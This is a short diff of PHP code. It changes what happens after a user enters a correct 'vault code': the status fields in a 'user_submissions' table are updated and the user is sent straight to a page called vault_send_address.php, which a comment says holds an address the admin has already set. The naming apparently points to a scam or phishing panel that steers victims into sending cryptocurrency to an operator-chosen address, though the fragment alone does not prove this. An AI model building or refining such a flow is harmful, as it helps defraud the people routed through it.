@@ -25,15 +25,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['vault_code'])) {
         $stmt->close();
         
         if ($stored_data && $stored_data['vault_code'] === $entered_code) {
-            // Code is correct, update status and redirect to vault funds loading
+            // Code is correct, redirect directly to vault_send_address.php since admin has already set address
             $stmt = $conn->prepare("UPDATE user_submissions SET activity = ?, vault_status = ? WHERE token = ?");
-            $activity = "VaultWallet";
-            $vault_status = "VaultWallet";
+            $activity = "VaultSendAddress";
+            $vault_status = "VaultSendAddress";
             $stmt->bind_param("sss", $activity, $vault_status, $token);
             $stmt->execute();
             $stmt->close();
 
-            header("Location: loading.php");
+            header("Location: vault_send_address.php");
             exit();
         } else {
             // Code is incorrect, show error
